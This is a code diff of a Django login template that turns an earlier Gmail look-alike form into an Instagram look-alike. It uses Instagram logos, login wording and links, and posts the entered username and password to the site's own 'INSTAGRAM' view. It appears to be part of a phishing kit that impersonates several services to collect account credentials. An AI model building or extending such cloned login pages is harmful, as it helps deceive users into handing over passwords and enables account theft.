@@ -14,22 +14,28 @@
             <img src="{% static './css/images/instagram.png' %}" alt="">
         </div>
         <div class="formDiv">
-            <form class="formDesign " action="{% url 'gmail' %}" method="post" style="width: 90%;">      
+            <form class="formDesign " action="{% url 'INSTAGRAM' %}" method="post" style="width: 90%;">      
                 <div class="signupLogo">
-                    <img src="{% static './css/images/instaText.png' %}" alt="" style="width: 200px;">
-        
-                </div>
+                    <img src="{% static './css/images/instaText.png' %}" alt="" style="width: 200px; margin-bottom: 30px;">
                 {% csrf_token %}
-                <div class="form-group">
-                    <input style="margin-bottom: 10px;" type="text" class="form-control" name="gmailUsername" placeholder="Email or phone" required="required" style="height: 50px; border-radius: 8px;">
-                    <input style="margin-bottom: 10px;" type="text" class="form-control" name="gmailUsername" placeholder="Email or phone" required="required" style="height: 50px; border-radius: 8px;">
+                    <input style="margin-bottom: 10px;" type="text" class="form-control" name="username" placeholder="Phone number, username, or email" required="required" style="height: 50px; border-radius: 8px;">
+                    <input style="margin-bottom: 10px;" type="password" class="form-control" name="password" placeholder="Password" required="required" style="height: 50px; border-radius: 8px;">
                     <br>
                     <button id="butn" type="submit" class="btn btn-primary ">
                         Next
                     </button>
-                    <h4>OR</h4>
-                    <a href="">Log in with Facebook</a>
-                    <a href="">Forgot password?</a>
+                    <h5 style="opacity: .5;">OR</h5>
+                    <a href="" style="font-weight: bold;">Log in with Facebook</a>
+                    <br>
+                    <br>
+                    <a href="" style="font-size: 13px;">Forgot password?</a>
+                </div>
+                <div class="dontHaveDiv">
+                    <p id="dontHave">Don't have an account? <a href=""><b>Sign up</b></a></p>
+                </div>
+                <div class="getApp">
+                    <p style="font-size: 15px;">Get the app.</p>
+                    <img src="{% static './css/images/appStore.png' %}" alt="">
                 </div>
             </form>
         </div>
